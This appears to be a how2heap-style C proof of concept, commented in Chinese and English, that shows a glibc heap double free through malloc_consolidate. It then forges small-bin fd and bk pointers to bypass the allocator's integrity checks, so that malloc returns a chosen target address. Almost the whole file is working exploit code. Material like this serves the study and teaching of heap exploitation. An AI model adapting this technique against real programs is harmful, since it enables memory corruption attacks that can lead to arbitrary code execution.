#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>

int main() {
  void* p1 = malloc(0x40);
  void* p2 = malloc(0x40);
  fprintf(stderr, "Allocated two fastbins: p1=%p p2=%p\n", p1, p2);
  fprintf(stderr, "Now free p1!\n");
  free(p1);

  char* p3 = malloc(0x400);
  fprintf(stderr, "Allocated large bin to trigger malloc_consolidate(): p3=%p\n", p3);
  fprintf(stderr, "In malloc_consolidate(), p1 is moved to the small bin.\n");
  free(p1);
  fprintf(stderr, "Trigger the double free vulnerability!\n");
  fprintf(stderr, "We can pass the check in malloc() since p1 is not fast top.\n");
  //alloc chunk A in fastbin
  char * chunkA = malloc(0x40);
  //修改分配出的chunk A的bk域(此时chunk A仍然位于small bin中)为target addr
  //edit bk field of chunkA(still in small bin but has a pointer point to) to target addr
  unsigned long long * edit_field_bk = (unsigned long long *)chunkA + 0x01;
  char * target_addr = p3 + 0x500;
  *edit_field_bk = (unsigned long long)(target_addr);
  
  //修改target space中的fake fd/fake bk域
  //edit fake fd / fake bk field in target space
  unsigned long long * target_addr_fd = (unsigned long long *)target_addr + 0x02;
  unsigned long long * target_addr_bk = (unsigned long long *)target_addr + 0x03;
  //target space的fake fd指向chunk A头部,过chunkA->bk->fd == chunkA
  //point fake fd of target space to head of chunk A, bypass checking:chunkA->bk->fd == chunkA 
  *target_addr_fd = (unsigned long long)(chunkA - 0x10);
  //target space的fake bk指向 chunk A+0x08 位置(chunk A + 0x18 位置上为target space的指针)
  //fake bk of target space point to addr chunk A + 0x08(there's a pointer pointing to target space in chunkA + 0x18)
  //实现target->bk->fd == target
  //bypass checking : target->bk->fd == target
  *target_addr_bk = (unsigned long long)(chunkA - 0x08);

  char * chunkA_small = malloc(0x40); 
  char * target_ptr = malloc(0x40);
  fprintf(stderr, "Now we alloc a chunk of size(chunkA) to address%p, our target address is%p\n", target_ptr, target_addr);
  
}